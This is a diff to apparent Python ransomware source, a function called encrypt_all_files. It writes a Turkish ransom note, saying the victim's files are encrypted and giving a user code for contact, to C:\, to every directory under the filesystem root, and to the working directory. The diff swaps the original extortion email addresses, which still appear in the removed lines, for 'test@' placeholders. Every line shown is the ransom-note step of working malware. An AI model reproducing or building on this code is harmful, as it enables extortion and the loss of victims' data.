@@ -104,7 +104,7 @@ def encrypt_all_files(password,salt3,pcno):
     try:
         with open("C:\\OKU.txt", "w",encoding="utf-8") as f:
             f.write(
-                f"{getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Kullanıcı Kodun ile İletişime Geçmelisin. \n elooatishere@proton.me \n elooatishere@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
+                f"{getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Kullanıcı Kodun ile İletişime Geçmelisin. \n test@proton.me \n test@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
     except:
         pass
 
@@ -135,7 +135,7 @@ def encrypt_all_files(password,salt3,pcno):
     for root, dirs, files in os.walk("/"):
         try:
             with open(os.path.join(root, 'OKU.txt'), 'w',encoding="utf-8") as f:
-                f.write(f" {getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Hesap İsmin ile İletişime Geçmelisin. \n elooatishere@proton.me \n elooatishere@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
+                f.write(f" {getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Hesap İsmin ile İletişime Geçmelisin. \n test@proton.me \n test@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
         except:
             pass
 
@@ -143,7 +143,7 @@ def encrypt_all_files(password,salt3,pcno):
     try:
         with open("OKU.txt", "w",encoding="utf-8") as f:
             f.write(
-                f"{getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Kullanıcı Kodun ile İletişime Geçmelisin. \n elooatishere@proton.me \n elooatishere@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
+                f"{getpass.getuser()} Tüm Dosyaların Şifrelenmiştir.\n Şifreleri Kaldırmak İçin Kullanıcı Kodun ile İletişime Geçmelisin. \n test@proton.me \n test@mail2tor.com \n Kullanıcı Kodun: {pcno} ")
     except:
         pass
 
